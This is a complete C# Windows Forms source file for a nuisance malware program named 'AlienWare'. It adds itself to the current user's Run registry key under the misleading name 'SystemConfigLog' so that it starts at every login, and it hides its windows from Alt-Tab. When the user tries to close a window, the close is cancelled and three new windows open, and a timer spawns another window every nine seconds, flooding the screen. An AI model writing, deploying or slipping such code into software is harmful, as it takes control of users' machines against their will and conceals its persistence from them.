using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System;   
using System.Media;
namespace AlienWare
{
	public partial class MainForm : Form
	{
		        private static readonly Random random = new Random();
		private const int GWL_EXSTYLE = -20;
		private const int WS_EX_TOOLWINDOW = 0x00000080;
		[DllImport("user32.dll")]
		private static extern int GetWindowLong(IntPtr hWnd, int nIndex);
		[DllImport("user32.dll")]
		private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
		public MainForm()
		{
			InitializeComponent();
		}
		void MainFormFormClosing(object sender, FormClosingEventArgs e)
		{
			if (e.CloseReason == CloseReason.UserClosing)
			{
				e.Cancel = true;
			}
			Hide();
			Form clone = new  MainForm();
			clone.Show();
			Form clon = new  MainForm();
			clon.Show();
			Form re = new  MainForm();
			re.Show();
		}
		void MainFormLoad(object sender, System.EventArgs e)
		{
			            SystemSounds.Hand.Play(); // Play the Windows error sound
			TopMost = true;
			HideFromAltTab(this);
			using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
			{
				key.SetValue("SystemConfigLog", Application.ExecutablePath);
			}
			int exStyle = GetWindowLong(this.Handle, GWL_EXSTYLE);
			SetWindowLong(this.Handle, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
			            Timer timer = new Timer();
            timer.Interval = 9000; //  seconds
            timer.Tick += TimerTick;
            timer.Start();
		}
		private static void HideFromAltTab(Form form)
		{
			int exStyle = GetWindowLong(form.Handle, GWL_EXSTYLE);
			exStyle |= WS_EX_TOOLWINDOW;
			SetWindowLong(form.Handle, GWL_EXSTYLE, exStyle);
		}
		void Label1Click(object sender, EventArgs e)
		{
			
		}
		void PictureBox1Click(object sender, EventArgs e)
		{
			
		}
		void Button1Click(object sender, EventArgs e)
		{
			Hide();
			Form clone = new  MainForm();
			clone.Show();
			Form clon = new  MainForm();
			clon.Show();
			clon.Location = GetRandomPosition();
			Form re = new  MainForm();
			re.Show();
			re.Location = GetRandomPosition();
		}
		        private void TimerTick(object sender, EventArgs e)
        {
            Form newForm = new MainForm();
            newForm.StartPosition = FormStartPosition.Manual;
            newForm.Location = GetRandomPosition();
            newForm.Show();
        }

        private Point GetRandomPosition()
        {
            Screen screen = Screen.PrimaryScreen;
            int x = random.Next(screen.Bounds.Width - Width);
            int y = random.Next(screen.Bounds.Height - Height);
            return new Point(x, y);
        }
	} 
}